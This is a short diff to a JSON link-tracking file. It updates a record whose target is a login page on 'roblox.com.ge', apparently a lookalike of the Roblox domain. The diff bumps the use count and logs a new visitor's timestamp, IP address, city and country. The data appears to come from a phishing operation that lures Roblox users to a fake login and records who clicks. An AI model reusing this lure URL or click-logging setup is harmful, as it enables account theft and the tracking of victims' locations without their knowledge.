@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 852,
+    "useCount": 853,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6928,6 +6928,14 @@
         "city": "Hanoi",
         "flag": "🇻🇳",
         "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777182298974,
+        "ip": "172.225.230.37",
+        "country": "Australia",
+        "city": "Brisbane",
+        "flag": "🇦🇺",
+        "countryCode": "AU"
       }
     ]
   },
